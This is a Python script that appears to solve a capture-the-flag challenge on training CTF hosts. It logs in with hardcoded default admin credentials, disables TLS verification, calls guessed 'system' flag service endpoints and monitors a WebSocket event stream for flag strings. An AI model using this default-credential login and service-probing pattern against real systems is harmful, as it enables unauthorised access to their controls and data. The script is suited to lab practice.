#!/usr/bin/env python3
"""
Monitor WebSocket for system service responses
Focus on system.coordinator_flag, system.get_coordinator_flag, etc.
"""
import requests
import json
import websocket
import threading
import time
import ssl

class SystemServiceMonitor:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.base_url = "https://training.my-ctf.com:8812"
        self.token = None
        self.ws = None
        self.messages = []
        self.service_responses = []
        self.flag_found = False

        # Login
        self._authenticate()

    def _authenticate(self):
        """Get authentication token"""
        login_url = "http://training-pod2.ctfchile.com:32780/api/v2/auth/login"
        resp = self.session.post(login_url, json={"username": "admin", "password": "admin1234"})
        self.token = resp.json()["access_token"]
        self.session.headers.update({
            "Authorization": f"Bearer {self.token}",
            "Content-Type": "application/json"
        })
        print(f"[+] Authenticated")

    def enhanced_message_handler(self, ws, message):
        try:
            timestamp = time.strftime('%H:%M:%S')
            msg_data = json.loads(message)
            msg_type = msg_data.get('type')

            if msg_type == 'auth_required':
                auth_msg = {"type": "auth", "access_token": self.token}
                ws.send(json.dumps(auth_msg))

            elif msg_type == 'auth_ok':
                print(f"[{timestamp}] WebSocket authenticated!")

                # Subscribe to service call events
                subscribe_msg = {
                    "id": 1,
                    "type": "subscribe_events",
                    "event_type": "call_service"
                }
                ws.send(json.dumps(subscribe_msg))

                # Subscribe to service responses
                subscribe_system = {
                    "id": 2,
                    "type": "subscribe_events",
                    "event_type": "system_response"
                }
                ws.send(json.dumps(subscribe_system))

            elif msg_type == 'result':
                result = msg_data.get('result', {})
                print(f"[{timestamp}] RESULT: {json.dumps(result, indent=2)}")

                # Check for flag in result
                result_str = json.dumps(result)
                if 'flag{' in result_str.lower() or 'ctf{' in result_str.lower():
                    print(f"[!!!] FLAG FOUND IN RESULT: {result_str}")
                    self.flag_found = True

            elif msg_type == 'event':
                event = msg_data.get('event', {})
                event_data = event.get('data', {})

                print(f"[{timestamp}] EVENT: {json.dumps(event, indent=2)}")

                # Look for service responses, especially system services
                if 'service' in event_data:
                    service_name = event_data.get('service', '')
                    if any(keyword in service_name for keyword in ['coordinator_flag', 'get_flag', 'unlock_flag']):
                        print(f"[!!!] SYSTEM FLAG SERVICE EVENT: {json.dumps(event, indent=2)}")
                        self.service_responses.append(event)

                # Look for any flag patterns
                event_str = json.dumps(event)
                if 'flag{' in event_str.lower() or 'ctf{' in event_str.lower():
                    print(f"[!!!] FLAG FOUND IN EVENT: {event_str}")
                    self.flag_found = True

                # Check for coordinator-specific events
                if 'coordinator' in event_str.lower():
                    print(f"[!] COORDINATOR EVENT: {json.dumps(event, indent=2)}")

            else:
                print(f"[{timestamp}] OTHER: {json.dumps(msg_data)[:200]}...")

            # Store all messages
            self.messages.append((timestamp, msg_data))

        except Exception as e:
            print(f"[!] Message parsing error: {e}")
            print(f"Raw message: {message}")

    def trigger_system_services(self):
        """Trigger the working system services"""
        print("\n[*] Triggering system flag services...")

        services = [
            "system.coordinator_flag",
            "system.get_coordinator_flag",
            "system.get_flag",
            "system.unlock_flag"
        ]

        for service in services:
            try:
                service_name = service.split('.')[1]
                service_url = f"{self.base_url}/api/v2/services/system/{service_name}"

                print(f"[*] Calling {service}...")
                resp = self.session.post(service_url, json={})
                result = resp.json()

                print(f"    Response: {result}")

                # Wait for WebSocket response
                time.sleep(5)

            except Exception as e:
                print(f"    Error: {e}")

    def start_monitoring(self):
        """Start monitoring with service calls"""
        print("[*] Starting system service monitoring...")

        ws_url = self.base_url.replace('https://', 'wss://') + "/api/websocket"

        self.ws = websocket.WebSocketApp(
            ws_url,
            on_message=self.enhanced_message_handler,
            on_error=lambda ws, error: print(f"[!] WebSocket error: {error}"),
            on_close=lambda ws, c1, c2: print(f"[!] WebSocket closed")
        )

        # Start WebSocket
        ws_thread = threading.Thread(target=self.ws.run_forever, kwargs={'sslopt': {"cert_reqs": ssl.CERT_NONE}})
        ws_thread.daemon = True
        ws_thread.start()

        # Wait for connection
        time.sleep(3)

        # Trigger services
        self.trigger_system_services()

        # Monitor for responses
        print("\n[*] Monitoring for service responses (60 seconds)...")
        for i in range(60):
            if self.flag_found:
                print("[!!!] FLAG FOUND! Stopping monitor.")
                break
            time.sleep(1)

        # Print results
        self.print_results()

        # Close
        if self.ws:
            self.ws.close()

    def print_results(self):
        """Print monitoring results"""
        print(f"\n[*] === MONITORING RESULTS ===")
        print(f"Total messages: {len(self.messages)}")
        print(f"Service responses: {len(self.service_responses)}")

        if self.service_responses:
            print("\n[!] System service responses:")
            for i, response in enumerate(self.service_responses):
                print(f"  {i+1}. {json.dumps(response, indent=4)}")

        # Check recent messages for flags
        print("\n[*] Recent messages analysis:")
        for timestamp, msg in self.messages[-10:]:
            msg_str = json.dumps(msg)
            if any(keyword in msg_str.lower() for keyword in ['flag', 'coordinator', 'system']):
                print(f"  [{timestamp}] {msg_str[:150]}...")

if __name__ == "__main__":
    monitor = SystemServiceMonitor()
    monitor.start_monitoring()